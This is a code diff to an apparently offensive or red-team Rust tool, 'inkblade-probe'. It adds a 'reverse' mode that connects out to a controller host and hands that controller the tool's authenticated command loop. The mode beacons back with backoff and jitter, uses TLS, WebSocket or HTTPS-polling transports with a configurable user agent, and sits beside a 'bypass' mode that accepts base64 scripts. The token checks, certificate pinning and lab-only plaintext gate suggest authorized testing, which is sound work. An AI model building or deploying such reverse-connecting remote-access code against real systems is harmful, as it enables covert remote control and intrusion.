@@ -27,6 +27,7 @@ mod server;
 mod sha256;
 mod spawn;
 mod template;
+mod transport;
 mod util;
 
 use std::fs;
@@ -76,6 +77,98 @@ fn run() -> Result<i32, String> {
             }
             server::serve(opts)?;
             Ok(0)
+        }
+        "reverse" => {
+            // Probe-initiated transport: dial the controller, then run the
+            // exact same authenticated server loop as `run --stdio`.
+            if opts.token.is_empty() {
+                return Err(
+                    "reverse requires --token, --token-file or INKBLADE_PROBE_TOKEN".to_string(),
+                );
+            }
+            let mut host_arg: Option<String> = None;
+            let mut port_arg: Option<u16> = None;
+            for value in &positional {
+                match value.parse::<u16>() {
+                    Ok(port) if port_arg.is_none() && port != 0 => port_arg = Some(port),
+                    _ if host_arg.is_none() => host_arg = Some(value.clone()),
+                    _ => {}
+                }
+            }
+            let host = host_arg
+                .or_else(|| std::env::var("INKBLADE_REVERSE_HOST").ok())
+                .filter(|value| !value.is_empty())
+                .ok_or_else(|| "reverse requires --host HOST".to_string())?;
+            let port = port_arg
+                .or_else(|| {
+                    std::env::var("INKBLADE_REVERSE_PORT")
+                        .ok()
+                        .and_then(|value| value.parse::<u16>().ok())
+                })
+                .filter(|value| *value != 0)
+                .ok_or_else(|| "reverse requires --port PORT".to_string())?;
+            let transport_name = if opts.transport == "lab-plaintext" {
+                if std::env::var("INKBLADE_ALLOW_PLAINTEXT_LAB").ok().as_deref() != Some("1") {
+                    return Err(
+                        "plaintext reverse requires INKBLADE_ALLOW_PLAINTEXT_LAB=1 "
+                            .to_string(),
+                    );
+                }
+                "lab-plaintext".to_string()
+            } else {
+                if !matches!(opts.transport.as_str(), "tls" | "wss" | "https") {
+                    return Err(format!("unsupported --transport {}", opts.transport));
+                }
+                if opts.pin.is_none() {
+                    return Err("encrypted reverse requires --pin <sha256>".to_string());
+                }
+                if opts.ca_file.is_none() {
+                    return Err("encrypted reverse requires --ca-file <ca.pem>".to_string());
+                }
+                opts.transport.clone()
+            };
+            let mut attempt: u32 = 0;
+            loop {
+                let started = std::time::Instant::now();
+                let result = transport::connect(&opts, &host, port).and_then(|(reader, writer)| {
+                    server::serve_with_transport(
+                        opts.clone(),
+                        reader,
+                        writer,
+                        &transport_name,
+                    )
+                });
+                match result {
+                    Ok(()) => {}
+                    Err(error) => {
+                        if error.contains("authentication failed")
+                            || error.contains("client disconnected before auth")
+                        {
+                            return Err(error);
+                        }
+                        if opts.no_reconnect
+                            || (opts.max_retries > 0 && attempt >= opts.max_retries)
+                        {
+                            return Err(error);
+                        }
+                        eprintln!("inkblade-probe: reverse transport error: {error}");
+                    }
+                }
+                if opts.no_reconnect {
+                    return Ok(0);
+                }
+                if started.elapsed() > std::time::Duration::from_secs(60) {
+                    attempt = 0;
+                }
+                let base = if attempt >= 6 { 60u64 } else { 1u64 << attempt };
+                let jitter = (util::random_bytes(1)[0] as u64 * 3) % 700;
+                let delay = std::time::Duration::from_millis(base * 1000 + jitter);
+                std::thread::sleep(delay);
+                attempt = attempt.saturating_add(1);
+                if attempt > 12 {
+                    attempt = 6;
+                }
+            }
         }
         "collect" => {
             let audit = Audit::new(opts.audit_sink, opts.audit_path.clone(), &opts.probe_id);
@@ -252,6 +345,44 @@ fn parse_options(args: Vec<String>) -> Result<(Options, Vec<String>), String> {
                     .parse::<usize>()
                     .map_err(|_| "--max-window must be a number".to_string())?;
             }
+            "--connect-timeout-ms" => {
+                opts.connect_timeout_ms = next_value(&args, &mut index, "--connect-timeout-ms")?
+                    .parse::<u64>()
+                    .map_err(|_| "--connect-timeout-ms must be a number".to_string())?;
+            }
+            "--transport" => {
+                opts.transport = next_value(&args, &mut index, "--transport")?;
+            }
+            "--lab-plaintext" => {
+                opts.transport = "lab-plaintext".to_string();
+            }
+            "--ca-file" => {
+                opts.ca_file = Some(PathBuf::from(next_value(&args, &mut index, "--ca-file")?));
+            }
+            "--pin" => {
+                opts.pin = Some(next_value(&args, &mut index, "--pin")?);
+            }
+            "--sni" => {
+                opts.sni = Some(next_value(&args, &mut index, "--sni")?);
+            }
+            "--ws-path" => {
+                opts.ws_path = next_value(&args, &mut index, "--ws-path")?;
+            }
+            "--poll-path" => {
+                opts.poll_path = next_value(&args, &mut index, "--poll-path")?;
+            }
+            "--result-path" => {
+                opts.result_path = next_value(&args, &mut index, "--result-path")?;
+            }
+            "--user-agent" => {
+                opts.user_agent = next_value(&args, &mut index, "--user-agent")?;
+            }
+            "--no-reconnect" => opts.no_reconnect = true,
+            "--max-retries" => {
+                opts.max_retries = next_value(&args, &mut index, "--max-retries")?
+                    .parse::<u32>()
+                    .map_err(|_| "--max-retries must be a number".to_string())?;
+            }
             "--audit" => {
                 opts.audit_path = Some(PathBuf::from(next_value(&args, &mut index, "--audit")?));
             }
@@ -301,7 +432,9 @@ fn parse_options(args: Vec<String>) -> Result<(Options, Vec<String>), String> {
                 positional.push(next_value(&args, &mut index, "--port")?);
             }
             "--path" => {
-                positional.push(next_value(&args, &mut index, "--path")?);
+                let value = next_value(&args, &mut index, "--path")?;
+                opts.ws_path = value.clone();
+                positional.push(value);
             }
             "--" => {
                 positional.extend(args[index..].iter().cloned());
@@ -339,6 +472,9 @@ fn usage() {
          \n\
          Usage:\n\
            inkblade-probe run --stdio --token-file PATH [--read-only|--allow-write]\n\
+           inkblade-probe reverse --transport tls|wss|https --host HOST --port PORT \n\
+             --ca-file CA.pem --pin SHA256 [--sni NAME] [--token-file PATH]\n\
+           inkblade-probe reverse --host HOST --port PORT --lab-plaintext  (lab tests only)\n\
            inkblade-probe collect [--read-only]\n\
            inkblade-probe bypass --plan JSON [--allow-write]\n\
            inkblade-probe bypass --technique ID --script-b64 B64 [--workdir DIR]\n\
